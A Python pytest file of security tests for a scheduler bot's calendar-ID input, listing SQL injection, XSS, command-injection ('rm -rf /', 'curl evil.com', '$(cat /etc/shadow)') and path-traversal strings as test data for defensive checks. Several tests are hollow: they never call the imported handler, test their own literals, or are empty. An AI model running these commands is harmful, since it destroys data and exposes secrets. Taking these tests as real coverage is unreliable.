"""
Security tests for meeting scheduler bot
Tests input validation, SQL injection protection, etc.
"""
import pytest
import re
from unittest.mock import Mock, patch
from src.handlers.manager_calendar_simple import set_calendar_id
from src.database import User, UserRole

class TestCalendarIDValidation:
    """Test calendar ID input validation security."""
    
    def test_valid_calendar_ids(self):
        """Test that valid calendar IDs pass validation."""
        valid_ids = [
            "user@gmail.com",
            "test.user@company.org",
            "manager-123@workspace.google.com",
            "a@b.co",
            "user+tag@domain.com"
        ]
        
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        
        for calendar_id in valid_ids:
            assert re.match(email_pattern, calendar_id), f"Valid ID rejected: {calendar_id}"
    
    def test_sql_injection_protection(self):
        """Test protection against SQL injection attacks."""
        malicious_ids = [
            "user@gmail.com'; DROP TABLE users; --",
            "admin@test.com' OR '1'='1",
            "user@domain.com'; UPDATE users SET role='ADMIN'; --",
            "test@example.com' UNION SELECT * FROM users; --"
        ]
        
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        
        for malicious_id in malicious_ids:
            assert not re.match(email_pattern, malicious_id), f"Malicious ID accepted: {malicious_id}"
    
    def test_xss_protection(self):
        """Test protection against XSS attacks."""
        xss_ids = [
            "<script>alert('xss')</script>@test.com",
            "user@<script>alert(1)</script>.com",
            "javascript:alert(1)@domain.com",
            "user@domain.com<img src=x onerror=alert(1)>"
        ]
        
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        
        for xss_id in xss_ids:
            assert not re.match(email_pattern, xss_id), f"XSS payload accepted: {xss_id}"
    
    def test_command_injection_protection(self):
        """Test protection against command injection."""
        command_injection_ids = [
            "user@domain.com; rm -rf /",
            "test@example.com | cat /etc/passwd",
            "user@domain.com && curl evil.com",
            "admin@test.com `whoami`",
            "user@domain.com $(cat /etc/shadow)"
        ]
        
        dangerous_patterns = [
            r'[;|&`$()]',  # Command injection
        ]
        
        for malicious_id in command_injection_ids:
            for pattern in dangerous_patterns:
                if re.search(pattern, malicious_id, re.IGNORECASE):
                    # Pattern should be detected
                    break
            else:
                pytest.fail(f"Command injection not detected: {malicious_id}")
    
    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks."""
        path_traversal_ids = [
            "../../../etc/passwd@domain.com",
            "user@domain.com/../config",
            "..\\..\\windows\\system32@evil.com"
        ]
        
        for path_id in path_traversal_ids:
            assert '../' in path_id or '..\\'  in path_id, f"Path traversal not detected: {path_id}"
    
    def test_length_limits(self):
        """Test calendar ID length validation."""
        # RFC 5321 email length limit is 320 characters
        long_id = "a" * 310 + "@domain.com"  # 321 chars total
        assert len(long_id) > 320, "Test setup error"
        
        # Should be rejected due to length
        # In real code this would be handled by the validation function

class TestDatabaseSecurity:
    """Test database security measures."""
    
    def test_unique_calendar_constraint(self):
        """Test that calendar IDs must be unique per user."""
        # This would test the database constraint
        # In real implementation, trying to insert duplicate should fail
        pass
    
    def test_transaction_rollback(self):
        """Test that failed operations rollback properly."""
        # Mock database error and verify rollback
        pass

class TestAuthenticationSecurity:
    """Test authentication and authorization security."""
    
    def test_oauth_simple_conflict_detection(self):
        """Test detection of OAuth vs Simple method conflicts."""
        # Mock user with OAuth credentials
        user = Mock()
        user.oauth_credentials = "existing_oauth_token"
        user.google_calendar_id = None
        
        # Should detect conflict and prevent simple calendar setup
        assert user.oauth_credentials is not None, "Should detect OAuth conflict"
    
    def test_role_based_access_control(self):
        """Test that only managers can set calendar."""
        # Test various user roles
        roles_access = [
            (UserRole.OWNER, False),    # Owners should not access manager features
            (UserRole.MANAGER, True),   # Managers should have access
            (UserRole.EMPLOYEE, False), # Employees should not have access
            (UserRole.PENDING, False),  # Pending users should not have access
        ]
        
        for role, should_have_access in roles_access:
            user = Mock()
            user.role = role
            
            has_access = (user.role == UserRole.MANAGER)
            assert has_access == should_have_access, f"Access control failed for {role}"

class TestRateLimiting:
    """Test rate limiting and abuse protection."""
    
    def test_calendar_test_rate_limit(self):
        """Test that calendar access testing is rate limited."""
        # Should implement rate limiting for calendar access tests
        # to prevent brute force enumeration
        pass
    
    def test_command_rate_limit(self):
        """Test that commands are rate limited per user."""
        # Should prevent spam of setcalendar commands
        pass

if __name__ == "__main__":
    # Run basic validation tests
    test = TestCalendarIDValidation()
    test.test_valid_calendar_ids()
    test.test_sql_injection_protection()
    test.test_xss_protection()
    test.test_command_injection_protection()
    test.test_path_traversal_protection()
    
    print("✅ All security tests passed!")